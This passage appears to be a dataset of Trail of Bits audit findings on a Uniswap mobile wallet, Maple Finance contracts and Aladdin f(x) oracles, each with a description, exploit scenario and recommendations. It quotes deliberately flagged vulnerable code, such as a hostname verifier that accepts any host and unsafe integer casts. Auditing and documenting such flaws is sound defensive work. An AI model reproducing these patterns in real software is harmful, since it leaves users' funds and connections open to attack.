foreground. Since the application access setting is not enabled, he can see the plaintext mnemonic and steals Alices funds. Recommendations Short term, enable both biometric authentication requirements (application access and transaction signing) when the user has enabled biometric authentication during the initial enrollment process. Alternatively, inform the user that they should manually enable the application access setting.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "22. An insecure HostnameVerier that disables SSL hostname validation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "The NoopHostnameVerifier class in the org.apache.http.conn.ssl package denes a HostnameVerifier() method that does not validate the servers hostname (gure 22.1). This allows an attacker to perform a PITM attack on a user's connection to spoof the server with the users hostname by providing a certicate from another host. Due to the lack of hostname verication, the client would accept this certicate. It is important to note that, according to the policy, Beginning March 1, 2017, Google Play will block publishing of any new apps or updates that use an unsafe implementation of HostnameVerifier. package org.apache.http.conn.ssl; import javax.net.ssl.HostnameVerifier; import javax.net.ssl.SSLSession; /* loaded from: classes5.dex */ public class NoopHostnameVerifier implements HostnameVerifier { public static final NoopHostnameVerifier INSTANCE = new NoopHostnameVerifier(); public final String toString() { return \"NO_OP\"; } @Override // javax.net.ssl.HostnameVerifier public boolean verify(String str, SSLSession sSLSession) { return true; } } Figure 22.1: The decompiled NoopHostnameVerifier class in the jadx-gui tool The issue is of informational severity because we were unable to exploit this nding by using a certicate signed by a valid CA but for invalid hostnames. In this case, logcat shows an SSL error. Exploit Scenario From the users perspective: An attacker carries out a PITM attack by using a CA-signed certicate issued for a domain the attacker owns. Because the implementation of the HostnameVerifier method accepts any certicate signed by a valid CA for any hostname, the attackers certicate is accepted. From the application owners perspective: The application is removed from or is blocked from being published in Google Play because of the unsafe implementation of the HostnameVerifier method, which does not validate hostnames. Recommendations Short term, identify which library introduces the vulnerable code and follow potential xes to ensure that the Uniswap mobile wallet uses the default hostname validation logic or that the custom HostnameVerifier interface returns false when the servers hostname does not meet the expected value. References  Google Help: How to resolve Insecure HostnameVerier", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "23. Sentry SDK uses getRunningAppProcesses to get a list of running apps ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "The Sentry SDK uses the getRunningAppProcesses method (gure 23.1), which is intended only for debugging or building a user-facing process management the UI. Also, the Android Security 2014 Year in Review Google report states that, Throughout 2014, we have regularly tightened the denition of Spyware, for example in 2014 we began to classify applications that send the list of other applications on the device as Spyware. This may cause the Uniswap mobile application to be removed from the store. Figure 23.1: Part of the io.sentry.android.core package that uses the getRunningAppProcesses method The issue remains open on the Sentry GitHub: Issue #2187, Consider removing function call: ActivityManager.getRunningAppProcesses(). Recommendations Short term, refer to Sentry to get information about when the isForegroundImportance is nally updated, or consider removing the Sentry SDK from the Uniswap wallet. Long term, periodically review other usages of the getRunningAppProcesses method using the jadx-gui tool on the production release APK.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "26. Leakage of data to third-party ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "We found that the Uniswap mobile wallet shares device-specic information with third-party entities, including OneSignal, Sentry, and Google Services. This practice poses privacy risks, as the shared data encompasses attributes such as time zone, device model, OS version, and Advertising Identier. For instance, the application sends requests with the data shown in gure 26.1 to the OneSignal API: POST https://api.onesignal.com/players SDK-Version: onesignal/android/040805 Accept: application/vnd.onesignal.v1+json Content-Type: application/json; charset=UTF-8 Content-Length: 500 User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; Pixel 3a Build/QQ1A.191205.011) {\"app_id\":\"5b27c29c-281e-4cc4-8659-a351d97088b0\",\"device_os\":\"dt.osv.11\",\"timezone\": -14400,\"timezone_id\":\"America\\/New_York\",\"language\":\"en\",\"sdk\":\"040805\",\"sdk_type\":\" react\",\"android_package\":\"com.uniswap\",\"device_model\":\"Pixel 4\",\"game_version\":1000001,\"net_type\":0,\"carrier\":\"DT_Carrier\",\"rooted\":true,\"identif ier\":\"etFD-KouTlWyiNLnbq-kwR:APA91bGRu1ougP1RVPB4nJoLNr3iIrZ0s6hN44btOIGF-xt592HeKch Z89rnn7PeGhK00a5XTu-NdRk_t0wps69JJkWfgZCTdFyy3uSEU6WG_zJUCA79uBL5TH-i206OeX35BM-Nbm7 3\",\"device_type\":1} Figure 26.1: Example request from the Uniswap mobile wallet to the OneSignal API Exploit Scenario An attacker intercepts data transmitted by the Uniswap mobile wallet, which includes information about the users device model, carrier, and physical location. Using this data, the adversary creates a highly targeted phishing attack that appears to be a legitimate communication from Uniswap or the identied carrier. The communication directs the user to a convincingly mimicked import wallet page. Unaware of the malicious redirect, the user enters his mnemonics. With this information, the attacker gains access to the user's account on Uniswap and outright steals the user's funds. Recommendations Short term, if sending device details to the parties is desired, include a comprehensive overview of this data-sharing practice in the applications privacy policy. If not, congure relevant SDKs to not share redundant user data or remove specic SDKs from the Uniswap mobile wallet codebase if they are not needed. Long term, periodically perform network analysis via Burp Suite Professional to monitor and verify the type of data transmitted to third parties. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. Incorrect argument passed to _getPlatformOriginationFee ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf", "body": "The getOriginationFees function incorrectly uses msg.sender instead of the loan_ parameter. As a result, it returns an incorrect result to users who want to know how much a loan is paying in origination fees. function getOriginationFees(address loan_, uint256 principalRequested_) external view override returns (uint256 originationFees_) { originationFees_ = _getPlatformOriginationFee(msg.sender, principalRequested_) + delegateOriginationFee[msg.sender]; } Figure 1.1: getOriginationFees function (loan/contracts/MapleLoanFeeManager.sol#147-149) Exploit Scenario Bob, a borrower, wants to see how much his loan is paying in origination fees. He calls getOriginationFees but receives an incorrect result that does not correspond to what the loan actually pays. Recommendations Short term, correct the getOriginationFees function to use loan_ instead of msg.sender. Long term, add tests for view functions that are not used inside the protocol but are intended for the end-users.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "2. The protocol could stop working prematurely ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf", "body": "The _uint48 function is incorrectly implemented such that it requires the input to be less than or equal to type(uint32).max instead of type(uint48).max. This could lead to the incorrect reversion of successful executions. function _uint48(uint256 input_) internal pure returns (uint32 output_) { require(input_ <= type(uint32).max, \"LM:UINT32_CAST_OOB\"); output_ = uint32(input_); } Figure 2.1: _uint48 function (pool-v2/contracts/LoanManager.sol#774-777) The function is mainly used to keep track of when each loans payment starts and when it is due. All variables for which the result of _uint48 is assigned are eectively of uint48 type. Exploit Scenario The protocol stops working when we reach a block.timestamp value of type(uint32).max instead of the expected behavior to work until the block.timestamp reaches a value of type(uint48).max. Recommendations Short term, correct the _uint48 implementation by checking that the input_ is less than the type(uint48).max and that it returns an uint48 type. Long term, improve the unit-tests to account for extreme but valid states that the protocol supports. 3. Insu\u0000cient event generation Severity: Low Diculty: Low Type: Auditing and Logging Finding ID: TOB-MPL-3 Target: globals-v2/contracts/MapleGlobals.sol", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "4. Incorrect GovernorshipAccepted event argument ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf", "body": "The MapleGlobals contract emits the GovernorshipAccepted event with an incorrect previous owner value. MapleGlobals implements a two-step process for ownership transfer in which the current owner has to set the new governor, and then the new governor has to accept it. The acceptGovernor function rst sets the new governor with _setAddress and then emits the GovernorshipAccepted event with the rst argument dened as the old governor and the second the new one. However, because the admin() function returns the current value of the governor, both arguments will be the new governor. function acceptGovernor() external { require(msg.sender == pendingGovernor, \"MG:NOT_PENDING_GOVERNOR\"); _setAddress(ADMIN_SLOT, msg.sender); pendingGovernor = address(0); emit GovernorshipAccepted(admin(), msg.sender); } Figure 4.1: acceptGovernor function (globals-v2/contracts/MapleGlobals.sol#87-92) Exploit Scenario The Maple team decides to transfer the MapleGlobals governor to a new multi-signature wallet. The team has a script that veries the correct execution by checking the events emitted; however, this script creates a false alert because the GovernorshipAccepted event does not have the expected arguments. Recommendations Short term, emit the GovernorshipAccepted event before calling _setAddress. Long term, add tests to check the events have the expected arguments.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "5. Partially incorrect Chainlink price feed safety checks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf", "body": "The getLatestPrice function retrieves a specic asset price from Chainlink. However, the price (a signed integer) is rst checked that it is non-zero and then is cast to an unsigned integer with a potentially negative value. An incorrect price would temporarily aect the expected amount of fund assets during liquidation. function getLatestPrice(address asset_) external override view returns (uint256 latestPrice_) { // If governor has overridden price because of oracle outage, return overridden price. if (manualOverridePrice[asset_] != 0) return manualOverridePrice[asset_]; ( uint80 roundId_, int256 price_, , uint256 updatedAt_, uint80 answeredInRound_ ) = IChainlinkAggregatorV3Like(oracleFor[asset_]).latestRoundData(); require(updatedAt_ != 0, \"MG:GLP:ROUND_NOT_COMPLETE\"); require(answeredInRound_ >= roundId_, \"MG:GLP:STALE_DATA\"); require(price_ != int256(0), \"MG:GLP:ZERO_PRICE\"); latestPrice_ = uint256(price_); } Figure 5.1: getLatestPrice function (globals-v2/contracts/MapleGlobals.sol#297-308) Exploit Scenario Chainlinks oracle returns a negative value for an in-process liquidation. This value is then unsafely cast to an uint256. The expected amount of fund assets from the protocol is incorrect, which prevents liquidation. Recommendations Short term, check that the price is greater than 0. Long term, add tests for the Chainlink price feed with various edge cases. Additionally, set up a monitoring system in the event of unexpected market failures. A Chainlink oracle can have a minimum and maximum value, and if the real price is outside of that range, it will not be possible to update the oracle; as a result, it will report an incorrect price, and it will be impossible to know this on-chain.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "6. Incorrect implementation of EIP-4626 ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf", "body": "The Pool implementation of EIP-4626 is incorrect for maxDeposit and maxMint because these functions do not consider all possible cases in which deposit or mint are disabled. EIP-4626 is a standard for implementing tokenized vaults. In particular, it species the following:  maxDeposit: MUST factor in both global and user-specic limits. For example, if deposits are entirely disabled (even temporarily), it MUST return 0.  maxMint: MUST factor in both global and user-specic limits. For example, if mints are entirely disabled (even temporarily), it MUST return 0. The current implementation of maxDeposit and maxMint in the Pool contract directly call and return the result of the same functions in PoolManager (gure 6.1). As shown in gure 6.1, both functions rely on _getMaxAssets, which correctly checks that the liquidity cap has not been reached and that deposits are allowed and otherwise returns 0. However, these checks are insucient. function maxDeposit(address receiver_) external view virtual override returns (uint256 maxAssets_) { maxAssets_ = _getMaxAssets(receiver_, totalAssets()); } function maxMint(address receiver_) external view virtual override returns (uint256 maxShares_) { uint256 totalAssets_ = totalAssets(); uint256 totalSupply_ = IPoolLike(pool).totalSupply(); uint256 maxAssets_ = _getMaxAssets(receiver_, totalAssets_); maxShares_ = totalSupply_ == 0 ? maxAssets_ : maxAssets_ * totalSupply_ / totalAssets_; } [...] function _getMaxAssets(address receiver_, uint256 totalAssets_) internal view returns (uint256 maxAssets_) { bool depositAllowed_ = openToPublic || isValidLender[receiver_]; uint256 liquidityCap_ = liquidityCap; maxAssets_ = liquidityCap_ > totalAssets_ && depositAllowed_ ? liquidityCap_ - totalAssets_ : 0; } Figure 6.1: The maxDeposit and maxMint functions (pool-v2/contracts/PoolManager.sol#L451-L461) and the _getMaxAssets function (pool-v2/contracts/PoolManager.sol#L516-L520) The deposit and mint functions have a checkCall modier that will call the canCall function in the PoolManager to allow or disallow the action. This modier rst checks if the global protocol pause is active; if it is not, it will perform additional checks in _canDeposit. For this issue, it will be impossible to deposit or mint if the Pool is not active. function canCall(bytes32 functionId_, address caller_, bytes memory data_) external view override returns (bool canCall_, string memory errorMessage_) { if (IMapleGlobalsLike(globals()).protocolPaused()) { return (false, \"PM:CC:PROTOCOL_PAUSED\"); } if (functionId_ == \"P:deposit\") { ( uint256 assets_, address receiver_ ) = abi.decode(data_, (uint256, address)); } return _canDeposit(assets_, receiver_, \"P:D:\"); if (functionId_ == \"P:depositWithPermit\") { ( uint256 assets_, address receiver_, , , , ) = abi.decode(data_, (uint256, address, uint256, uint8, bytes32, bytes32)); return _canDeposit(assets_, receiver_, \"P:DWP:\"); } if (functionId_ == \"P:mint\") { ( uint256 shares_, address receiver_ ) = abi.decode(data_, (uint256, address)); \"P:M:\"); } return _canDeposit(IPoolLike(pool).previewMint(shares_), receiver_, if (functionId_ == \"P:mintWithPermit\") { ( uint256 shares_, address receiver_, , , , , ) = abi.decode(data_, (uint256, address, uint256, uint256, uint8, bytes32, bytes32)); return _canDeposit(IPoolLike(pool).previewMint(shares_), receiver_, \"P:MWP:\"); } [...] function _canDeposit(uint256 assets_, address receiver_, string memory errorPrefix_) internal view returns (bool canDeposit_, string memory errorMessage_) { if (!active) return (false, _formatErrorMessage(errorPrefix_, \"NOT_ACTIVE\")); if (!openToPublic && !isValidLender[receiver_]) return (false, _formatErrorMessage(errorPrefix_, \"LENDER_NOT_ALLOWED\")); if (assets_ + totalAssets() > liquidityCap) return (false, _formatErrorMessage(errorPrefix_, \"DEPOSIT_GT_LIQ_CAP\")); return (true, \"\"); } Figure 6.2: The canCall function (pool-v2/contracts/PoolManager.sol#L370-L393), and the _canDeposit function (pool-v2/contracts/PoolManager.sol#L498-L504) The maxDeposit and maxMint functions should return 0 if the global protocol pause is active or if the Pool is not active; however, these cases are not considered. Exploit Scenario A third-party protocol wants to deposit into Maples pool. It rst calls maxDeposit to obtain the maximum amount of asserts it can deposit and then calls deposit. However, the latter function call will revert because the protocol is paused. Recommendations Short term, return 0 in maxDeposit and maxMint if the protocol is paused or if the pool is not active. Long term, maintain compliance with the EIP specication being implemented (in this case, EIP-4626).", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "7. setAllowedSlippage and setMinRatio functions are unreachable ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf", "body": "The administrative functions setAllowedSlippage and setMinRatio have a requirement that they can be called only by the poolManager. However, they are not called by any reachable function in the PoolManager contract. function setAllowedSlippage(address collateralAsset_, uint256 allowedSlippage_) external override { require(msg.sender == poolManager, \"LM:SAS:NOT_POOL_MANAGER\"); require(allowedSlippage_ <= HUNDRED_PERCENT, \"LM:SAS:INVALID_SLIPPAGE\"); emit AllowedSlippageSet(collateralAsset_, allowedSlippageFor[collateralAsset_] = allowedSlippage_); } function setMinRatio(address collateralAsset_, uint256 minRatio_) external override { require(msg.sender == poolManager, \"LM:SMR:NOT_POOL_MANAGER\"); emit MinRatioSet(collateralAsset_, minRatioFor[collateralAsset_] = minRatio_); } Figure 7.1: setAllowedSlippage and setMinRatio function (pool-v2/contracts/LoanManager.sol#L75-L85) Exploit Scenario Alice, a pool administrator, needs to adjust the slippage parameter of a particular collateral token. Alices transaction reverts since she is not the poolManager contract address. Alice checks the PoolManager contract for a method through which she can set the slippage parameter, but none exists. Recommendations Short term, add functions in the PoolManager contract that can reach setAllowedSlippage and setMinRatio on the LoanManager contract. Long term, add unit tests that validate all system parameters can be updated successfully.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "8. Inaccurate accounting of unrealizedLosses during default warning revert ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf", "body": "During the process of executing the removeDefaultWarning function, an accounting discrepancy fails to decrement netLateInterest from unrealizedLosses, resulting in an over-inated value. The triggerDefaultWarning function updates unrealizedLosses with the defaulting loans principal_, netInterest_, and netLateInterest_ values. emit UnrealizedLossesUpdated(unrealizedLosses += _uint128(principal_ + netInterest_ + netLateInterest_)); Figure 8.1: The triggerDefaultWarning function (pool-v2/contracts/LoanManager.sol#L331) When the warning is removed by the _revertDefaultWarning function, only the values of the defaulting loans principal and interest are decremented from unrealizedLosses. This leaves a discrepancy equal to the amount of netLateInterest_. function _revertDefaultWarning(LiquidationInfo memory liquidationInfo_) internal { accountedInterest -= _uint112(liquidationInfo_.interest); unrealizedLosses -= _uint128(liquidationInfo_.principal + liquidationInfo_.interest); } Figure 8.2: The _revertDefaultWarning function (pool-v2/contracts/LoanManager.sol#L631-L634) Exploit Scenario Alice has missed several interest payments on her loan and is about to default. Bob, the poolManager, calls triggerDefaultWarning on the loan to account for the unrealized loss in the system. Alice makes a payment to bring the loan back into good standing, the claim function is triggered, and _revertDefaultWarning is called to remove the unrealized loss from the system. The net value of Alices loans late interest value is still accounted for in the value of unrealizedLosses. From then on, when users call Pool.withdraw, they will have to exchange more shares than are due for the same amount of assets. Recommendations Short term, add the value of netLateInterest to the amount decremented from unrealizedLosses when removing the default warning from the system. Long term, implement robust unit-tests and fuzz tests to validate math and accounting ows throughout the system to account for any unexpected accounting discrepancies.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "9. Attackers can prevent the pool manager from nishing liquidation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf", "body": "The finishCollateralLiquidation function requires that a liquidation is no longer active. However, an attacker can prevent the liquidation from nishing by sending a minimal amount of collateral token to the liquidator address. function finishCollateralLiquidation(address loan_) external override nonReentrant returns (uint256 remainingLosses_, uint256 platformFees_) { require(msg.sender == poolManager, \"LM:FCL:NOT_POOL_MANAGER\"); require(!isLiquidationActive(loan_), \"LM:FCL:LIQ_STILL_ACTIVE\"); [...] if (toTreasury_ != 0) ILiquidatorLike(liquidationInfo_.liquidator).pullFunds(fundsAsset, mapleTreasury(), toTreasury_); if (toPool_ != 0) ILiquidatorLike(liquidationInfo_.liquidator).pullFunds(fundsAsset, pool, toPool_); if (recoveredFunds_ != 0) ILiquidatorLike(liquidationInfo_.liquidator).pullFunds(fundsAsset, ILoanLike(loan_).borrower(), recoveredFunds_); Figure 9.1: An excerpt of the finishCollateralLiquidation function (pool-v2/contracts/LoanManager.sol#L199-L232) The finishCollateralLiquidation function uses the isLiquidationActive function to verify if the liquidation process is nished by checking the collateral asset balance of the liquidator address. Because anyone can send tokens to that address, it is possible to make isLiquidationActive always return false. function isLiquidationActive(address loan_) public view override returns (bool isActive_) { address liquidatorAddress_ = liquidationInfo[loan_].liquidator; // TODO: Investigate dust collateralAsset will ensure `isLiquidationActive` is always true. isActive_ = (liquidatorAddress_ != address(0)) && (IERC20Like(ILoanLike(loan_).collateralAsset()).balanceOf(liquidatorAddress_) != uint256(0)); } Figure 9.2: The isLiquidationActive function (pool-v2/contracts/LoanManager.sol#L702-L707) Exploit Scenario Alice's loan is being liquidated. Bob, the pool manager, tries to call finishCollateralLiquidation to get back the recovered funds. Eve front-runs Bobs call by sending 1 token of the collateral asset to the liquidator address. As a consequence, Bob cannot recover the funds. Recommendations Short term, use a storage variable to track the remaining collateral in the Liquidator contract. As a result, the collateral balance cannot be manipulated through the transfer of tokens and can be safely checked in isLiquidationActive. Long term, avoid using exact comparisons for ether and token balances, as users can increase those balances by executing transfers, making the comparisons evaluate to false.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "10. WithdrawalManager can have an invalid exit conguration ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf", "body": "The setExitConfig function sets the conguration to exit from the pool. However, unsafe casting allows this function to set an invalid conguration. The function performs a few initial checks; for example, it checks that windowDuration is not 0 and that windowDuration is less than cycleDuration. However, when setting the conguration, the initialCycleId_, initialCycleTime_, cycleDuration_, and windowDuration_ are unsafely casted to uint64 from uint256. In particular, cycleDuration_ and windowDuration_ are user-controlled by the poolDelegate. function setExitConfig(uint256 cycleDuration_, uint256 windowDuration_) external override { CycleConfig memory config_ = _getCurrentConfig(); require(msg.sender == poolDelegate(), \"WM:SEC:NOT_AUTHORIZED\"); require(windowDuration_ != 0, \"WM:SEC:ZERO_WINDOW\"); require(windowDuration_ <= cycleDuration_, \"WM:SEC:WINDOW_OOB\"); require( cycleDuration_ != config_.cycleDuration || windowDuration_ != config_.windowDuration, \"WM:SEC:IDENTICAL_CONFIG\" ); [...] cycleConfigs[latestConfigId_] = CycleConfig({ initialCycleId: uint64(initialCycleId_), initialCycleTime: uint64(initialCycleTime_), cycleDuration: uint64(cycleDuration_), windowDuration: uint64(windowDuration_) }); } Figure 10.1: The setExitConfig function (withdrawal-manager/contracts/WithdrawalManager.sol#L83-L115) Exploit Scenario Bob, the pool delegate, calls setExitCong with cycleDuration_ equal to type(uint64).max + 1 and windowDuration_ equal to type(uint64).max. The checks pass, but the conguration does not adhere to the invariant windowDuration <= cycleDuration. Recommendations Short term, safely cast the variables when setting the conguration to avoid any possible errors. Long term, improve the unit-tests to check that important invariants always hold.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "11. Loan can be impaired when the protocol is paused ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf", "body": "The impairLoan function allows the poolDelegate or governor to impair a loan when the protocol is paused due to a missing whenProtocolNotPaused modier. The role of this function is to mark the loan at risk of default by updating the loans nextPaymentDueDate. Although it would be impossible to default the loan in a paused state (because the triggerDefault function correctly has the whenProtocolNotPaused modier), it is unclear if the other state variable changes would be a problem in a paused system. Additionally, if the protocol is unpaused, it is possible to call removeLoanImpairment and restore the loans previous state. function impairLoan(address loan_) external override { bool isGovernor_ = msg.sender == governor(); require(msg.sender == poolDelegate || isGovernor_, \"PM:IL:NOT_AUTHORIZED\"); ILoanManagerLike(loanManagers[loan_]).impairLoan(loan_, isGovernor_); emit LoanImpaired(loan_, block.timestamp); } Figure 11.1: The impairLoan function (pool-v2/contracts/PoolManager.sol#L307-315) Exploit Scenario Bob, the MapleGlobal security admin, sets the protocol in a paused state due to an unknown occurrence, expecting the protocols state to not change and debugging the possible issue. Alice, a pool delegate who does not know that the protocol is paused, calls impairLoan, thereby changing the state and making Bobs debugging more dicult. Recommendations Short term, add the missing whenProtocolNotPaused modier to the impairLoan function. Long term, improve the unit-tests to check for the correct system behavior when the protocol is paused and unpaused. Additionally, integrate the Slither script in appendix D into the development workow.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "12. Fee treasury could go to the zero address ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf", "body": "The _disburseLiquidationFunds and _distributeClaimedFunds functions, which send the fees to the various actors, do not check that the mapleTreasury address was set. Althoughthe mapleTreasury address is supposedly set immediately after the creation of the MapleGlobals contract, no checks prevent sending the fees to the zero address, leading to a loss for Maple. function _disburseLiquidationFunds(address loan_, uint256 recoveredFunds_, uint256 platformFees_, uint256 remainingLosses_) internal returns (uint256 updatedRemainingLosses_, uint256 updatedPlatformFees_) { [...] require(toTreasury_ == 0 || ERC20Helper.transfer(fundsAsset_, mapleTreasury(), toTreasury_), \"LM:DLF:TRANSFER_MT_FAILED\"); Figure 12.1: The _disburseLiquidationFunds function (pool-v2/contracts/LoanManager.sol#L566-L584) Exploit Scenario Bob, a Maple admin, sets up the protocol but forgets to set the mapleTreasury address. Since there are no warnings, the expected claim or liquidation fees are sent to the zero address until the Maple team notices the issue. Recommendations Short term, add a check that the mapleTreasury is not set to address zero in _disburseLiquidationFunds and _distributeClaimedFunds. Long term, improve the unit and integration tests to check that the system behaves correctly both for the happy case and the non-happy case.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "1. Missing event emission ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-aladdinfx-oracle-securityreview.pdf", "body": "The critical operation updateOnchainSpotEncodings does not emit an event. Having an event emitted to reect changes to this critical storage variable will allow other system/o-chain components to detect suspicious behavior in the system. 88 function updateOnchainSpotEncodings ( bytes memory encodings) external onlyOwner { // validate encoding uint256 [] memory prices = _getSpotPriceByEncoding(encodings); if (prices.length == 0 ) revert(); 89 90 91 92 93 onchainSpotEncodings_BTCDerivativeUSD = encodings; 94 } Figure 1.1: The updateOnchainSpotEncodings function in FxBTCDerivativeOracleBase.sol#L88-L94 Events generated during contract execution aid in monitoring, baselining of behavior, and detecting suspicious activity. Without events, users and blockchain-monitoring systems cannot easily detect behavior that falls outside the baseline conditions; malfunctioning contracts and attacks could go undetected. Recommendations Short term, emit an event in the updateOnchainSpotEncodings function. Long term, ensure all state-changing operations are always accompanied by events. In addition, use static analysis tools such as Slither to help prevent such issues in the future.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "2. Missing zero-address checks in constructors ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-aladdinfx-oracle-securityreview.pdf", "body": "None of the constructors in the various oracle contracts validate that their address arguments do not equal the zero address. As a result, important immutable state variables might be set to the zero address during deployment, eectively making the given contract unusable and requiring a redeployment. 34 constructor ( address _Chainlink_BTC_USD_Twap ) { 35 Chainlink_BTC_USD_Twap = _Chainlink_BTC_USD_Twap; 36 37 _updateMaxPriceDeviation(1e16); // 1% 38 } Figure 2.1: The constructor in FxBTCDerivativeOracleBase.sol#L34-L38 18 address public immutable Chainlink_BTC_USD_Twap; Figure 2.2: The Chainlink_BTC_USD_Twap variable in FxBTCDerivativeOracleBase.sol#L18 Recommendations Short term, add a check to each constructor to ensure that each address argument does not equal the zero address. Long term, use the Slither static analyzer to catch common issues such as this one. Consider integrating a Slither scan into the projects CI pipeline, pre-commit hooks, or build scripts.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "3. Lack of validation of Chainlink price feed answers ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-aladdinfx-oracle-securityreview.pdf", "body": "The validation of the price returned by Chainlink is incomplete, which means that incorrect prices could be used in the protocol. This could lead to loss of funds or otherwise cause internal accounting errors that might break the correct functioning of the protocol. 46 function _readSpotPriceByChainlink ( bytes32 encoding ) internal view returns ( uint256 ) { address aggregator ; uint256 scale ; uint256 heartbeat ; 47 48 49 50 assembly { 51 aggregator := shr( 96 , encoding) 52 scale := and(shr( 32 , encoding), 0xffffffffffffffff ) 53 heartbeat := and(encoding, 0xffffffff ) 54 } 55 (, int256 answer , , uint256 updatedAt , ) = AggregatorV3Interface(aggregator).latestRoundData(); 56 57 58 } if ( block.timestamp - updatedAt > heartbeat) revert( \"expired\" ); return uint256 (answer) * scale; Figure 3.1: The _readSpotPriceByChainlink function in FxSpotOracleBase.sol#L46-L58 Because the Chainlink-returned price is of type int256 , the following two scenarios could happen:   The price feed answer could be a negative integer. First o, this is highly unlikely for the particular price feeds used by f(x). However, if a negative integer is returned, it will be unsafely cast to an unsigned integer ( uint256 ) on line 57 of _readSpotPriceByChainlink . This will likely lead to a revert because the unsigned value of a cast signed negative integer will likely be very high, but it might also lead to the use of an incorrect price. A Chainlink price feed can also return zero as the answer. In this case, the isValid Boolean will be set to false , which will ensure the incorrect price is not actually used, as shown in gure 3.2. external returns ( function getPrice () 103 104 105 view 106 override 107 108 109 110 111 112 ) 113 { 114 twap = _getLSDUSDTwap(); 115 (minPrice, maxPrice) = _getLSDMinMaxPrice(twap); 116 unchecked { 117 isValid = (maxPrice - minPrice) * PRECISION < maxPriceDeviation * bool isValid , uint256 twap , uint256 minPrice , uint256 maxPrice minPrice ; 118 } 119 } Figure 3.2: The getPrice function in FxLSDOracleV2Base.sol#L103-L119 Exploit Scenario The Chainlink price feed returns a negative price, which when cast to an unsigned integer is considered valid. As a result, an incorrect price is used. Recommendations Short term, add a check inside the _readSpotPriceByChainlink function that ensures answer is greater than 0 . Long term, add validation of returned results from all external sources.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "4. Lack of validation of updates to system conguration parameters ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-aladdinfx-oracle-securityreview.pdf", "body": "Several conguration functions (gures 4.14.3) do not validate that updates to conguration parameters actually result in a change in value. Although setting a parameter to its current value is benign, it may obscure a logical error in a peripheral program that would be readily identiable if the update were to revert and raise an alarm. uint256 oldMaxPriceDeviation = maxPriceDeviation; function _updateMaxPriceDeviation ( uint256 newMaxPriceDeviation ) private { 108 109 110 maxPriceDeviation = newMaxPriceDeviation; 111 112 emit UpdateMaxPriceDeviation(oldMaxPriceDeviation, newMaxPriceDeviation); 113 } Figure 4.1: The _updateMaxPriceDeviation function in FxBTCDerivativeOracleBase.sol#L108-L113 uint256 oldCoolingOffPeriod = coolingOffPeriod; function _updateCoolingOffPeriod ( uint256 _newCoolingOffPeriod ) private { 129 130 131 coolingOffPeriod = _newCoolingOffPeriod; 132 133 emit UpdateCoolingOffPeriod(oldCoolingOffPeriod, _newCoolingOffPeriod); 134 } Figure 4.2: The _updateCoolingOffPeriod function in LeveragedTokenV2.sol#L129-L134 130 function updateReader ( uint256 poolType , address newReader ) external onlyOwner { address oldReader = readers[poolType]; 131 132 readers[poolType] = newReader; 133 134 emit UpdateReader(poolType, oldReader, newReader); 135 } Figure 4.3: The updateReader function in SpotPriceOracle.sol#L130-L135 Recommendations Short term, add validation to these functions to require that the new value is not equal to the previous value. Long term, add validation to all conguration functions to ensure they either perform a conguration state update or cause a revert. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: 